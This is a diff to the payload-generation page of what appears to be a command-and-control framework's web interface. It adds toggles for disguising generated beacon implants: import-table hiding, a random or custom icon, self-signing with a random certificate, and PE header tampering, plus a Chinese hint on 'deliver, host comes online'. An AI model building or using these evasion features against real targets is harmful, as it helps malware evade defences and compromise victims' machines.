@@ -80,6 +80,11 @@ export function Generate() {
   const [sleep, setSleep] = useState(profile.defaultSleep || '5s')
   const [jitter, setJitter] = useState(0)
   const [listener, setListener] = useState('')
+  const [iatHiding, setIatHiding] = useState(true)
+  const [iconMode, setIconMode] = useState<'off' | 'random' | 'custom'>('off')
+  const [iconFile, setIconFile] = useState<File | null>(null)
+  const [exePseudoSign, setExePseudoSign] = useState(true)
+  const [peHeaderMod, setPeHeaderMod] = useState(true)
   const [busy, setBusy] = useState(false)
   const [result, setResult] = useState('')
   const [lastFile, setLastFile] = useState('')
@@ -146,6 +151,8 @@ export function Generate() {
   }, [compatible, listener, agent])
 
   const selectedListener = compatible.find((l) => l.l_name === listener)
+  const peFormat = format === 'Exe' || format === 'Service Exe' || format === 'DLL'
+  const exeFormat = format === 'Exe' || format === 'Service Exe'
   const showSleep = agent === 'beacon' || agent === 'kharon'
   const formatOptions =
     agent === 'gopher'
@@ -164,12 +171,19 @@ export function Generate() {
     try {
       let cfg = defaultAgentConfig(agent, format, arch, os)
       if (agent === 'beacon') {
+        let iconContent = ''
+        if (peFormat && iconMode === 'custom' && iconFile) {
+          iconContent = await fileToBase64(iconFile)
+        }
         cfg = {
           ...cfg,
           sleep,
           jitter,
-          iat_hiding: false,
-          exe_pseudo_sign: format === 'Exe' || format === 'Service Exe',
+          iat_hiding: iatHiding,
+          icon_random: peFormat && iconMode === 'random',
+          icon_content: iconContent,
+          exe_pseudo_sign: exeFormat && exePseudoSign,
+          pe_header_mod: peFormat && peHeaderMod,
         }
       } else if (agent === 'kharon') {
         cfg = { ...cfg, sleep, jitter }
@@ -376,6 +390,101 @@ export function Generate() {
                   </div>
                 </div>
               )}
+
+              {agent === 'beacon' && (
+                <>
+                  <div className="field">
+                    <label>IAT hiding</label>
+                    <div className="chip-row">
+                      <button
+                        type="button"
+                        className={iatHiding ? 'primary' : ''}
+                        title="空导入表 / no CRT"
+                        onClick={() => setIatHiding((v) => !v)}
+                      >
+                        {iatHiding ? '开' : '关'}
+                      </button>
+                    </div>
+                  </div>
+                  <div className="field">
+                    <label>图标伪装</label>
+                    <div className="chip-row">
+                      <button
+                        type="button"
+                        className={iconMode === 'off' ? 'primary' : ''}
+                        disabled={!peFormat}
+                        title={peFormat ? '不嵌入图标' : '仅 EXE / Service / DLL 可用'}
+                        onClick={() => { setIconMode('off'); setIconFile(null) }}
+                      >
+                        关
+                      </button>
+                      <button
+                        type="button"
+                        className={iconMode === 'random' ? 'primary' : ''}
+                        disabled={!peFormat}
+                        title={peFormat ? '随机嵌入 ICO' : '仅 EXE / Service / DLL 可用'}
+                        onClick={() => { setIconMode('random'); setIconFile(null) }}
+                      >
+                        随机 ICO
+                      </button>
+                      <button
+                        type="button"
+                        className={iconMode === 'custom' ? 'primary' : ''}
+                        disabled={!peFormat}
+                        title={peFormat ? '使用自定义 .ico' : '仅 EXE / Service / DLL 可用'}
+                        onClick={() => setIconMode('custom')}
+                      >
+                        自定义
+                      </button>
+                      {peFormat && iconMode === 'custom' && (
+                        <label className="gen-opt-file">
+                          <input
+                            type="file"
+                            accept=".ico,image/x-icon,image/vnd.microsoft.icon"
+                            onChange={(e) => setIconFile(e.target.files?.[0] || null)}
+                          />
+                          <span className="dim" style={{ fontSize: 11.5 }}>
+                            {iconFile ? iconFile.name : '选 .ico'}
+                          </span>
+                        </label>
+                      )}
+                      {!peFormat && (
+                        <span className="dim" style={{ fontSize: 11.5, alignSelf: 'center' }}>
+                          先选 EXE / DLL
+                        </span>
+                      )}
+                    </div>
+                  </div>
+                  <div className="field">
+                    <label>自签名</label>
+                    <div className="chip-row">
+                      <button
+                        type="button"
+                        className={exePseudoSign ? 'primary' : ''}
+                        disabled={!exeFormat}
+                        title={exeFormat ? '随机证书 + osslsigncode' : '仅 EXE / Service 可用'}
+                        onClick={() => setExePseudoSign((v) => !v)}
+                      >
+                        {exeFormat ? (exePseudoSign ? '开' : '关') : '仅 EXE'}
+                      </button>
+                    </div>
+                  </div>
+                  <div className="field">
+                    <label>PE 头</label>
+                    <div className="chip-row">
+                      <button
+                        type="button"
+                        className={peHeaderMod ? 'primary' : ''}
+                        disabled={!peFormat}
+                        title={peFormat ? 'Rich header + 时间戳 + checksum' : '仅 EXE / Service / DLL 可用'}
+                        onClick={() => setPeHeaderMod((v) => !v)}
+                      >
+                        {peFormat ? (peHeaderMod ? '开' : '关') : '仅 EXE / DLL'}
+                      </button>
+                    </div>
+                  </div>
+                </>
+              )}
             </div>
 
             {format === 'Stager' && (
@@ -387,7 +496,7 @@ export function Generate() {
             )}
             {agent === 'beacon' && format !== 'Stager' && (
               <div className="hint muted-hint">
-                生产建议：gcc + 关闭 iat_hiding。反复扫描同模式会触发云学习；单次投递优先 <b>Stager</b>。
+                IAT 默认开。图标 / 自签名 / PE 头在 EXE、Service、DLL 上生效。
               </div>
             )}
             {agent === 'kharon' && (
@@ -477,6 +586,32 @@ export function Generate() {
                   </b>
                 </div>
               )}
+              {agent === 'beacon' && (
+                <>
+                  <div>
+                    <span className="k">IAT</span>
+                    <b>{iatHiding ? 'hiding' : 'off'}</b>
+                  </div>
+                  {exeFormat && (
+                    <div>
+                      <span className="k">签名</span>
+                      <b>{exePseudoSign ? '自签名' : '无'}</b>
+                    </div>
+                  )}
+                  {peFormat && (
+                    <div>
+                      <span className="k">PE头</span>
+                      <b>{peHeaderMod ? 'mod' : 'off'}</b>
+                    </div>
+                  )}
+                  {peFormat && (
+                    <div>
+                      <span className="k">图标</span>
+                      <b>{iconMode === 'random' ? '随机 ICO' : iconMode === 'custom' ? (iconFile ? iconFile.name : '自定义') : '关'}</b>
+                    </div>
+                  )}
+                </>
+              )}
             </div>
             <div className="hint muted-hint" style={{ marginTop: 14 }}>
               流程：创建监听 → 选平台 → 选格式 → 生成 → 投递 → 主机上线。
@@ -504,6 +639,19 @@ export function Generate() {
       </div>
     </div>
   )
+}
+
+function fileToBase64(file: File): Promise<string> {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader()
+    reader.onload = () => {
+      const s = String(reader.result || '')
+      const i = s.indexOf(',')
+      resolve(i >= 0 ? s.slice(i + 1) : s)
+    }
+    reader.onerror = () => reject(reader.error || new Error('read icon failed'))
+    reader.readAsDataURL(file)
+  })
 }
 
 /** 芯片上显示更短的标签，完整名在 title */
